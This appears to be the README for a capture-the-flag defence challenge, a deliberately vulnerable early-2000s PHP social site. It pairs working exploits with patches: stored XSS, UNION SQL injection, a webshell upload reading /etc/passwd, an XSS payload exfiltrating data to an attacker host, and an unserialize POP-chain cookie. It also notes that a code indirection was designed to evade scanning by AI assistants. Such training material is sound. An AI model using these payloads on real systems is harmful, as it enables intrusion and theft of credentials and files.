# CySpace

**Author:** trenth
**Category:** Defence — Web
**Difficulty:** 1 easy / 2 medium / 2 hard (5 scoring hooks)
**Tracking:** [issue #52](https://github.com/CyberSCI/CS2026-NTL/issues/52)

> "CySpace": a pre-EMP social site whose last scrape was found on a dusty
> backup. The local community of Val Verde-adjacent survivors spun it back
> up on recovered hardware because it's the only comms medium everyone
> remembers the password to. You've been handed the source and the root
> password and told to keep it running without anyone getting doxxed (or
> worse) while the real rewrite is "coming soon."

A period-accurate early-2000s social-network web app deliberately seeded
with five canonical web vulnerabilities. The vulnerable stack is shipped
to teams as a Docker Compose bundle in [`release_files/`](./release_files);
teams patch source in place while the `siege`-framework attacker bot
([`server_files/cyspace_attacker.py`](./server_files/cyspace_attacker.py))
exercises every hook each tick.

## Tech stack

- PHP 5.6 on `php:5.6-apache` (Apache 2.4, mod_php, mysqli)
- MariaDB 10.5
- HTML 4.01 Transitional, inline CSS, ES3-only JS (no `let`/`const`/arrow)
- Docker Compose
- Bot: Python 3.10+, `requests`, `playwright`, `pwntools`, `jsonschema`

See [`SETUP.md`](./SETUP.md) for full deployment instructions (team VM,
bot VM, scoreboard wiring, snapshot prep).

## Host

`http://10.0.2.92`

## Independence matrix

Each scoring hook has its own proof-of-exploit, benign check, and patch
file(s). Patching one vulnerability **does not** affect any other hook's
score; every defended state is reached only by a focused patch.

Hooks verify exploitation via values defenders cannot tamper with by
filtering response content — service-intrinsic page content, OS files,
session usernames, or per-tick-random nonces echoed through a code
path only the vuln can reach. Defenders cannot kill a hook with an
input or output WAF filter on a fixed token; they must patch the
underlying vulnerability. Where exploits leave artefacts on disk or in
the DB, a full patch also requires cleaning those up.

The seeded admin account (`admin` / `B8KkKmpWPYkdBCtSqJy2`) is part of the service
contract — modifications to its credentials, username, or row state
(via the DB, via `seed-admins.php`, via the compose file, or via any
other means) are out-of-spec and treated equivalently to disabling
`/login.php` for member accounts. The correct H4 patch fixes the
JS-context interpolation in `src/admin/notes.php`, not the credential.

| Hook | Vuln | Difficulty | Proof-of-exploit | Benign verifies | Patch file(s) | Cross-hook effect |
| :--: | :--- | :---: | :--- | :--- | :--- | :--- |
| H1 | V1 — Guestbook stored XSS | Easy | victim browser regexes its rendered `Hello, <b>USERNAME</b>!` header; exfilled username matches a seeded pool member (per-tick rotated path + query key) | post a plain comment, read it back on profile | `src/guestbook.php`, `src/profile.php` | None |
| H2 | V2 — Union SQLi in friend search | Medium | UNION-injected SELECT echoes a per-call attacker nonce into the rendered results table; most variants additionally carry an `admins.password_bcrypt` subselect as an active red herring | search a pool username substring, find that user's row | `src/search.php` | None |
| H3 | V3 — Unrestricted upload → Apache RCE | Medium | uploaded `.php.jpg` `readfile()`s a random OS file (`/etc/passwd`, `/proc/version`, etc.); response contains the expected substring | upload a real GIF, fetch it back as `image/*` | `src/uploads/.htaccess`, `src/upload_pic.php` | None |
| H4 | V4 — Admin reflected XSS in JS-string context | Hard | admin browser fetches `/admin/notes.php`, regexes the body's `logged in as <b>USERNAME</b>` line, exfils the admin username (per-tick rotated path + query key) | admin posts a plain note and reads it back | `src/admin/notes.php` | None — htmlspecialchars-everywhere does NOT defend (see over-patch lesson) |
| H5 | V5 — `unserialize()` POP-chain → file read | Hard | POP gadget reads a random OS file; the response's `X-Export-Preview` header carries the expected substring | normal `prefs` cookie round-trip renders themed page | `src/inc/prefs_classes.php` | None |

**Shared risk: over-patch SLA break.** Some "blanket" patches (e.g. a
WAF dropping all traffic containing `<script`) accidentally kill benign
checks. This is intended — design rewards surgical fixes. See
[`solve_files/README.md`](./solve_files/README.md) "Over-patch lesson"
for the documented case (V4).

## Vulnerabilities

Each vuln has a self-contained patch in
[`solve_files/patches/`](./solve_files/patches/) and is verified by
[`solve_files/verify_fix.sh <id>`](./solve_files/verify_fix.sh).

<details>
<summary><b>V1 — Guestbook stored XSS</b> &middot; <i>Easy</i></summary>

**Where:** `src/guestbook.php` and `src/profile.php` render the comment
body via `<?php echo $row['body']; ?>` with no escaping. (Profile inline
comments — added in §2.6 — share the same token.)

**Exploit (manual):**

```bash
# As any logged-in user, post a payload comment to your OWN wall, then
# bait the admin browser into visiting your profile.
curl -c jar -b jar -d "username=tommy&password=password" http://HOST/login.php
# (use whichever pool user you have credentials for; the bot pool is in
# server_files/cyspace_attacker.py USERS[])
curl -c jar -b jar \
     -d "user_id=<your-id>" \
     --data-urlencode "body=<script>document.title='V1_FIRED'</script>" \
     http://HOST/post_message.php
# When the admin browser visits /profile.php?id=<your-id>, document.title flips.
```

The bot's `_h1_malicious` does the same thing, then drives a
Playwright session as a random seeded pool user to visit the profile
where the payload lives. The XSS regexes the rendered
`Hello, <b>USERNAME</b>!` header (intrinsic to logged-in pages only)
and exfils the captured username to the bot's listener on a per-tick
random URL path + query key. Receipt of any seeded pool username
proves session takeover.

**Patch:** [`solve_files/patches/V1_guestbook_xss.diff`](./solve_files/patches/V1_guestbook_xss.diff)
— wrap both render sites in `h()` (htmlspecialchars + `ENT_QUOTES` +
UTF-8; the helper is already defined in `inc/session.php`).

**Verify:** `./solve_files/verify_fix.sh 1`

</details>

<details>
<summary><b>V2 — Union-based SQLi in friend search</b> &middot; <i>Medium</i></summary>

**Where:** `src/search.php` line 14 builds the LIKE query via string
concatenation: `"... WHERE username LIKE '%" . $q . "%' ..."`.

**Exploit (manual):**

```bash
# UNION-inject into search.php's vulnerable username-LIKE concatenation
# and echo a chosen nonce back through the rendered result table. The
# bcrypt subselect in column 2 is a red herring — the bot verifies on
# the nonce in column 3, not on the admin hash.
curl -c jar -b jar -d "username=tommy&password=password" http://HOST/login.php
curl -G --data-urlencode \
     "q=zzz%' UNION SELECT 1,(SELECT password_bcrypt FROM admins LIMIT 1),'sqli_proof_42abx'-- " \
     http://HOST/search.php
# The result table's mood column carries the literal `sqli_proof_42abx`;
# the username column carries the bait $2y$NN$... hash (when seeded).
```

**Patch:** [`solve_files/patches/V2_search_sqli.diff`](./solve_files/patches/V2_search_sqli.diff)
— mysqli prepared statement with `?` placeholder; `%` wildcards bound
on the PHP side.

**Note:** `mysql_real_escape_string` plus proper quoting is an acceptable
fallback; `addslashes` is not.

**Verify:** `./solve_files/verify_fix.sh 2`

</details>

<details>
<summary><b>V3 — Unrestricted upload → Apache <code>AddType</code> RCE</b> &middot; <i>Medium</i></summary>

**Where:** Two cooperating bugs:

1. `src/upload_pic.php` accepts any file whose name ends in
   `.jpg` / `.jpeg` / `.png` / `.gif` (suffix string match only — no MIME
   inspection, no re-encoding).
2. `src/uploads/.htaccess` ships a vintage
   `AddType application/x-httpd-php .jpg` directive (decision D1 default;
   keeps the base image stock, puts the footgun where a 2000s dev would).

A file named `shell.php.jpg` passes the upload allow-list **and** is
served by Apache as PHP from the uploads directory.

**Exploit (manual):**

```bash
echo "GIF89a<?php readfile('/etc/passwd'); ?>" > shell.php.jpg
curl -c jar -b jar -d "username=tommy&password=password" http://HOST/login.php
curl -c jar -b jar -F "avatar=@shell.php.jpg" http://HOST/upload_pic.php
curl http://HOST/uploads/<your-id>_shell.php.jpg     # /etc/passwd in the body
```

The bot picks the target path randomly per call from a batch of OS
intrinsic files (`/etc/passwd`, `/etc/group`, `/proc/version`, etc.)
and verifies a known substring from whichever it chose, so a defender
cannot break the hook by output-filtering one fixed string.

**Patch:** [`solve_files/patches/V3_upload_rce.diff`](./solve_files/patches/V3_upload_rce.diff)
— defence in depth (any single layer closes the hook):

* Drop the unsafe `AddType .jpg` from `.htaccess`; replace with
  `php_flag engine off` so the directory cannot execute PHP at all.
* Reject any uploaded filename containing the substring `.php` (case
  insensitive).
* `finfo` MIME allow-list against `image/jpeg|png|gif`.

**Verify:** `./solve_files/verify_fix.sh 3`

</details>

<details>
<summary><b>V4 — Admin reflected XSS in JS-string context</b> &middot; <i>Hard</i></summary>

**Where:** `src/admin/notes.php` reflects `?highlight=` into an inline
`<script>` block as a JS-string literal:

```php
var HIGHLIGHT = '<?php echo addslashes($_GET['highlight']); ?>';
```

`addslashes` escapes `'`, `"`, `\`, NUL — but **not** `<` or `/` — so a
`</script>` breakout is unblocked. The admin browser (the `siege`
Playwright session) is the only context this reaches.

**Encoding gotcha (verified live 2026-04-30):** every char in the payload
is run through `addslashes`, so `'` and `"` become `\'`/`\"` and break JS
string syntax. The bot's H4 payload uses backticks and template-literal
interpolation (no `'` or `"` literals at all). It mirrors the H1 pattern
— same-origin fetch of `/admin/notes.php` from inside the admin's browser,
regex the body's `logged in as <b>USERNAME</b>` line, exfil that username
to a per-tick random path + query key:

```text
?highlight=</script><script>fetch(`/admin/notes.php`,{credentials:`include`}).then(r=>r.text()).then(t=>{var m=t.match(/logged in as <b>([^<]+)<\/b>/);if(m){fetch(`http://ATTACKER:PORT/<rand-path>?<rand-key>=${encodeURIComponent(m[1])}`)}}).catch(e=>{})</script>
```

**Exploit (manual):**

```bash
# Log in as admin first, then visit:
http://HOST/admin/notes.php?highlight=%3C/script%3E%3Cscript%3Edocument.title=%60V4_FIRED%60%3C/script%3E
```

**Patch:** [`solve_files/patches/V4_admin_jsxss.diff`](./solve_files/patches/V4_admin_jsxss.diff)
— `json_encode($_h, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT)`
provides quoted, JS-string-context-safe output. The surrounding `'...'`
quotes are removed because `json_encode` provides them itself.

**Why htmlspecialchars is wrong:** see
[`solve_files/README.md`](./solve_files/README.md) "Over-patch lesson
(V4)" for the full explanation. Default-flag htmlspecialchars does not
escape `'`; even with `ENT_QUOTES` the entities are not decoded inside
`<script>` raw-text mode and a `\`-based escape can still confuse the JS
lexer. The contextually-correct encoder is `json_encode`.

**Verify:** `./solve_files/verify_fix.sh 4`

</details>

<details>
<summary><b>V5 — Insecure <code>unserialize()</code> of a cookie</b> &middot; <i>Hard</i></summary>

**Where:** `src/prefs.php` reads the `prefs` cookie and hands it to
`theme_prefs_load_v1()` in `inc/prefs_classes.php`. That helper looks
period-appropriate (custom "CYP1:" + base64 "blob format" — exactly
the kind of in-house wrapper a 2003 dev would write) but at the
bottom of the function it calls `@unserialize()` on the base64-decoded
inner payload, so any cookie of shape `CYP1:<base64-of-serialized-POP-chain>`
still instantiates arbitrary classes. `inc/prefs_classes.php` also
defines `ProfileExporter` — a legacy class with a `__destruct` that
reads `$this->filename` into the `X-Export-Preview` response header —
which is the POP gadget.

The wrapper exists specifically to deflect surface-level
"grep for unserialize" scanning by AI assistants and pattern-matching
tools. The bug class is unchanged; the sink is just one indirection
deeper. **Teams should trace the helper call from `prefs.php` into
`inc/prefs_classes.php` to find the real sink.**

**Exploit (manual):**

```bash
INNER='O:15:"ProfileExporter":2:{s:8:"filename";s:11:"/etc/passwd";s:7:"preview";N;}'
COOKIE="CYP1:$(printf '%s' "$INNER" | base64 -w0)"
curl -i -b "prefs=${COOKIE}" http://HOST/prefs.php | grep X-Export-Preview
# X-Export-Preview: root:x:0:0:root:/root:/bin/sh
```

The bot picks the file randomly per call from a batch of OS intrinsic
files and verifies a known substring from whichever it chose.

**Patch:** [`solve_files/patches/V5_prefs_unserialize.diff`](./solve_files/patches/V5_prefs_unserialize.diff)
— rewrite `theme_prefs_load_v1` to `json_decode()` the inner payload
and reconstruct `ThemePrefs` from the decoded array;
`theme_prefs_save_v1` matches with `json_encode`. The `CYP1:` magic
prefix and base64 wrapping stay in place — only the *inner* parser
changes — so existing cookies are forward-compatible at the format
level (legitimate ThemePrefs cookies issued post-patch round-trip
cleanly).

**PHP 5.6 trap:** `unserialize($data, ['allowed_classes' => false])` is
**not** supported on this stack — the second argument is silently ignored
on 5.6. The `json_decode` swap is the only correct fix here.

**Verify:** `./solve_files/verify_fix.sh 5`

</details>

